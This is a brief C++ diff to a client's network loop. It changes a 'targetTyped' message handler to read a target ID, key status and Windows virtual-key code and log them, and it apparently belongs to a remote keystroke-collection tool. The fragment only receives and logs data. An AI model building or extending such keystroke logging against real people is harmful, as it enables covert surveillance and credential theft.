@@ -38,9 +38,14 @@ void Client::networkInitAndLoop()
 			switch (msg.getID())
 			{
 			case messageType::targetTyped:
-				char characterTyped;
-				msg >> characterTyped;
-				logger.out( KQINFO, { "Client typed: char - '{0}' int - '{1}\n", characterTyped, int(characterTyped) });
+				uint32_t targetID;
+				msg >> targetID;
+				keyStatus status;
+				msg >> status;
+				DWORD virtualKey;
+				msg >> virtualKey;
+
+				logger.out( KQINFO, { "Target {} typed: VK - {}\n", targetID, virtualKey});
 				break;
 			default:
 				break;
